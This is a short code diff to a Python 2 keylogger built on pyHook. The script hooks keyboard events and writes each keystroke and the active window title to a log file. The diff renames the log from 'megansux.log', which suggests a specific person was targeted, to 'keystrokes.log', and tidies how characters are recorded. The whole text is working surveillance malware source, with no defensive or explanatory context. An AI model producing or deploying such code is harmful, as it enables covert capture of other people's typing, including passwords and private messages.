@@ -6,19 +6,19 @@ try:
 except:
 	print "Either pyHook or pythoncom modules are missing!"
 
-logging.basicConfig(filename="megansux.log", level=logging.INFO, format='%(asctime)s %(message)s')
+logging.basicConfig(filename="keystrokes.log", level=logging.INFO, format='%(asctime)s %(message)s')
 
 window = None
 
 def OnKeyboardEvent(event):
-#    logging.info('MessageName: %s',event.MessageName)
-#    logging.info('Time: %s',event.Time)
     global window
     if event.WindowName != window:
         window = event.WindowName
         logging.info('New Window: %s',event.WindowName)
-    logging.info('Ascii: %s %s', event.Ascii, chr(event.Ascii))
-    logging.info('Key: %s', event.Key)
+    if chr(event.Ascii).isalpha() or chr(event.Ascii).isdigit():
+    	logging.info('Ascii Key: %s', chr(event.Ascii))
+    else:
+    	logging.info('Key: %s', event.Key)
 
 # return True to pass the event to other handlers
     return True
